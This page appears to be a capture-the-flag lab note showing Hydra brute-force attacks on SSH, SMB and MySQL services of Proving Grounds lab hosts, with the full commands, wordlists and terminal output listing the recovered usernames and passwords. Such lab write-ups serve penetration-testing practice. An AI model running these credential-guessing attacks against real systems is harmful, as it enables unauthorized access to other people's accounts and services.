---
layout: default
title: Hydra
parent: Cracking
nav_order: 5
---

# Hydra

---

## SSH

Run Hydra against the user accounts discovered by Enum4Linux and the passwords discovered in the /secrets directory

```bash
hydra -L users -P passwords ssh://192.168.166.90
```

Get the credential _seppuku:eeyoree_

![hydra](../../../../assets/images/ctfs/proving_grounds/seppuku/hydra.png)

## SMB

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ hydra -L users -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://192.168.166.90

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-30 08:46:53
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 3027 login tries (l:3/p:1009), ~3027 tries per task
[DATA] attacking smb://192.168.166.90:445/
[445][smb] host: 192.168.166.90   login: admin   password: tinkerbell
[445][smb] host: 192.168.166.90   login: administrator   password: password1
[445][smb] host: 192.168.166.90   login: root   password: elizabeth
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-30 08:46:58


```

## MySQL

Run Hydra against the mysql service with the _root_ username.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.243.88 mysql
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-05 16:11:17
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://192.168.243.88:3306/
[3306][mysql] host: 192.168.243.88   login: root   password: robert
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-05 16:11:26

```
